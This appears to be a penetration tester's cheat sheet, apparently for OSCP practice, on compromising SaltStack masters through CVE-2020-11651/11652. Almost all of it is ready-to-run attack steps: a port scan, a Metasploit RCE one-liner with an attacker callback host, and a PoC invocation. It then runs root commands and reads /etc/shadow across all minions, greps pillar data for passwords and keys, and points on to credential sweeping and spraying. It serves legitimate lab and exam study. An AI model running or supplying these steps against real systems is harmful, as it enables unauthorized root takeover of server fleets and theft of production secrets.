# SaltStack

## Before I start
- [ ] 4505 + 4506 both open = Salt master
nmap -p 4505,4506 --open <Targets>

## CVE-2020-11651/11652 (< 3000.2 / 2019.2.4)
- [ ] OSCP one-target limit: this Metasploit exploit spends my one target, even if it fails
searchsploit saltstack
msfconsole -q -x 'use exploit/linux/misc/saltstack_salt_unauth_rce; set RHOSTS <TargetIP>; set LHOST <AttackerIP>; run'
- [ ] Manual PoC: read /etc/shadow, get the root key, run commands on master + minions
python3 exploit.py --master <TargetIP> --exec 'id'
- [ ] Unauth → root on master. Metasploit is the reliable path

## Master owned = fleet owned
salt '*' cmd.run 'id'
salt '*' file.read /etc/shadow
- [ ] Every minion executes as root

## Loot the master
cat /etc/salt/master
ls /etc/salt/pki/master/
grep -rniE 'password|secret|key' /srv/salt /srv/pillar 2>/dev/null
- [ ] Pillar data = production secrets in cleartext YAML
- [ ] Same control-node model as ansible: :Pb ansible

## If it fails
- [ ] Patched (post-Apr-2020) → ports still confirm master; hunt pillar creds via other doors
- [ ] Only 4505 open → might be a minion-only host; less interesting

## Next
- [ ] Root → cred sweep: :Pb linux-creds
- [ ] Pillar secrets → reuse everywhere: :Pb spraying
